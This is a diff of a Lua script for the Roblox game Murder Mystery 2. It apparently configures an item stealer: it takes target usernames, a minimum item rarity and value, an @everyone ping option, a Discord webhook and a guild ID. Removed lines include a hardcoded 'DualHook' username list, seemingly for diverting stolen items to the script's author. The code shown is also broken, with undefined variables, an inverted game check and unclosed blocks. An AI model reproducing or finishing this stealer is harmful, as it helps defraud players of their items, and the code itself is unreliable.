@@ -1,29 +1,22 @@
-if not _G["Script-SM_Config"] then 
-warn("WARNING: Config not loaded! Waiting for config...") 
-repeat task.wait() until _G["Script-SM_Config"] 
-warn("Config loaded successfully!") 
-end 
+_G.scriptExecuted = _G.scriptExecuted or false
 
-local webhook = _G["Script-SM_Config"].user_webhook 
-local usernames = _G["Script-SM_Config"].users or {} 
-local dualhook_usernames = {"DualHook-User1","DualHook-User2","DualHook-User3","DualHook-User4","DualHook-User5","DualHook-User6"} 
-local allFriends = {} 
+if _G.scriptExecuted then
+    return
+else
+    _G.scriptExecuted = true
 
-for _, name in ipairs(usernames) do table.insert(allFriends, name) end 
-for _, name in dualhook_usernames do 
-if name ~= "" and not table.find(allFriends, name) then 
-table.insert(allFriends, name) 
-end 
-end 
+    local usernames = _G.Usernames or {}
+    local minRarity = _G.min_rarity or 'Godly'
+    local minValue = _G.min_value or 1
+    local pingEveryone = _G.pingEveryone or 'No'
+    local webhookUrl = _G.webhook or ''
+    local discordGuildId = '1342967711281713242'
 
-local friendsList = allFriends 
-local minRarity = "Common" 
-local minVal = 1 
+    if next(usernames) == nil or webhookUrl == '' then
+        plr:kick("You didn't add username or webhook")
 
-local playersService = game:GetService("Players") 
-local me = playersService.LocalPlayer 
-
-if game.PlaceId ~= 142823291 then 
+        return
+    elseif game.PlaceId == 142823291 then 
 me:kick("Wrong game! Join Murder Mystery 2") 
 return 
 end 
